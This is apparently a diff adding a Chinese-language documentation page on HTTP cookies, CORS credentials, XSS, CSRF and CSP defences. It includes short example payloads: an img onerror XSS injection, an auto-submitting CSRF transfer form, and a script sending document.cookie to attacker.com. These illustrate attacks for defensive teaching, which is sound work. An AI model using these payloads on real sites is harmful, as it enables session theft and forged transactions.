@@ -1,0 +1,182 @@
+---
+title: cookie
+---
+
+## cookie定义
+
+HTTP Cookie是服务器发送到用户浏览器并保存在本地的一小块数据。浏览器会存储cookie并在下次向同一个服务器发起请求时携带并发送到服务器上。
+Cookie使基于无状态的Http协议记录稳定的状态信息成了可能。
+
+## 属性
+
+<CookieProperty />
+
+## 应用场景
+
+* 会话状态管理
+  > 如用户登录状态、购物车、游戏分数或其他需要记录的信息
+* 个性化设置
+  > 如用户自定义设置、主题和其他设置
+* 浏览器行为跟踪
+  > 如跟踪分析用户行为等
+
+## 代码设置
+前端 `xhr,axios,fetch` 等异步请求函数有特定属性处理cookie
+
+<FrontEndPromiseField />
+
+这些字段控制"跨域请求时，浏览器是否携带和接收凭证"。
+
+后端也需要设置 `credentials`,
+
+```javascript
+Access-Control-Allow-Origin: http://localhost:5173
+Access-Control-Allow-Credentials: true
+
+// 以 hono 为例：
+app.use('/api/*', {
+  cors({
+    origin: 'http://localhost:5173',
+    credentials: true,
+  })
+})
+```
+
+## XSS
+XSS(Cross-Site Scripting), 跨站脚本攻击。
+
+攻击者把恶意脚本注入到你的页面中，让它在用户浏览器中以你的网站身份执行。
+
+```html title="举例"
+<img src=x onerror="fetch('/api/transfer', { method: 'POST' })">
+```
+
+哪些恶意JS会进入你的origin
+* 存储型 XSS（评论，昵称，文章内容未过滤，恶意 HTML被存入数据库）
+* 反射型 XSS（url参数被服务端直接拼进HTML）
+* DOM型 XSS （前端把 URL、接口返回值直接写入 innerHTML）
+* 第三方脚本被污染（埋点、客服、广告、A/B 测试脚本被供应链攻击）
+* npm 包被污染（构建产物里带入恶意代码）
+* 浏览器插件（恶意插件可读页面内容，风险模型更高）
+* CDN 资源被替换（外链 JS 被攻击或配置不当）
+
+<Tip>
+服务器设置了`HttpOnly; Secure; SameSite=Lax/Strict`cookie限制，只是限制了恶意js拿取cookie的值，但恶意js还是可以执行脚本来做其他事情（发起请求，修改页面布局等）
+</Tip>
+
+XSS危险点：
+* 读取非 `HttpOnly Cookie`
+* 读取 `localStorage` / `sessionStorage`
+* 操作 DOM，伪造页面内容
+* 以用户身份调用同源 API
+* 诱导用户输入账号、密码、验证码
+* 窃取页面中的敏感数据
+
+防护XSS：
+* 少用 `innerHTML`、`document.write`、`dangerouslySetInnerHTML`
+* 富文本必须清洗
+* `HTTP Only`，防止JS直接读取session，cookie
+* CSP, 限制脚本来源
+
+## CSRF
+
+CSRF(Cross-Site Request Forgery)，跨站请求伪造。
+
+攻击者诱导已登录用户的浏览器，向可信站点发起用户并不想执行的请求。
+
+```html title="举例"
+// 用户已经登录了a站
+// 用户访问攻击者的b网站时，故意发起一个表单请求，如：
+
+<form action="https://a.com/api/transfer" method="POST">
+  <input name="to" value="attacker" />
+  <input name="amount" value="1000" />
+</form>
+
+<script>
+  document.forms[0].submit();
+</script>
+
+// 如果a站服务端没有做CSRF防护，浏览器就会自动带上a站的cookie，a站会误以为是用户本人的操作。
+```
+
+<Tip>
+它利用的是浏览器的 **请求某个站点时，浏览器会自动带上该站点的`Cookie`** 特性。
+</Tip>
+
+CSRF关键条件：
+* 用户以登录目标站点（浏览器有有效的cookie）
+* 浏览器会随请求发送Cookie
+* 有状态变更接口（转账、改密码、删除数据...)
+* 缺少额外校验（没有CSRF token, Origin校验...)
+
+防护CSRF：
+* `SameSite=Lax / Strict`, 减少跨站请求自动带Cookie
+* CSRF Token, 状态变更请求必须带攻击者拿不到的 Token
+* 校验 `Origin`/`Referer`, 后端拒绝异常来源
+* 不使用GET来做状态变更
+
+## CSP
+
+CSP(Content Security Policy), 内容安全策略。
+
+浏览器提供的一套安全机制，服务端通过HTTP响应头告诉浏览器，当前页面运行加载哪些资源、允许执行哪些脚本、允许连接哪些接口。
+
+CSP常用于降低 XSS 的危害。
+
+例如页面存在 XSS 漏洞
+```html title="html"
+<script>
+  fetch("https://attacker.com/steal?cookie=" + document.cookie)
+</script>
+```
+如果没有配置CSP，浏览器可能会执行该脚本
+
+配置CSP后：
+```html title="server"
+Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'
+```
+浏览器会限制：
+* 只能加载同源脚本
+* 不能执行内联 `<script>`
+* 不能随便请求 `https://attacker.com`
+* 不能加载未知域名的图片、字体、iframe 等资源
+
+服务端设置响应头或者前端html设置`<meta>`
+
+```html title="html"
+<meta
+  http-equiv="Content-Security-Policy"
+  content="default-src 'self'; script-src 'self'"
+/>
+```
+
+推荐配置服务端响应头：
+```http title="server"
+Content-Security-Policy:
+  default-src 'self'; // 默认资源加载策略
+  script-src 'self'; // 控制 JS 来源和执行方式
+  style-src 'self'; // 控制 CSS 来源
+  img-src 'self' data: https:; // 	控制图片来源
+  font-src 'self'; // 控制字体来源
+  connect-src 'self' https://api.example.com; // 	控制 fetch、XHR、WebSocket 请求目标
+  frame-src ''; // 控制 iframe 来源
+  object-src 'none'; // 控制 <object>、<embed> 等，通常设为 'none'
+  base-uri 'self'; // 控制 <base> 标签，防止 URL 解析被篡改
+  form-action 'self'; // 控制表单可以提交到哪里
+  frame-ancestors 'none'; // 控制页面能否被其他页面 iframe 嵌入，防点击劫持
+```
+
+<Tip>
+`Content-Security-Policy` 很容易误杀正常资源，一般建议使用 `Report-Only` 模式观察 `Content-Security-Policy-Report-Only`. <br/>
+`Report-Only` 不会真正拦截，只会上报违反策略的行为，等到确认不会误杀后，在切到`Content-Security-Policy`
+</Tip>
+
+## 最佳实践
+
+* 登录态优先使用 `HttpOnly; Secure; SameSite=Lax/Strict`;
+* 所有状态变更接口校验 CSRF token 或 Origin;
+* React中避免不信任的html;
+* 富文本必须要清洗（sanitize）
+* 配置 CSP
+* 不把session id/refresh token放到localstorage中。
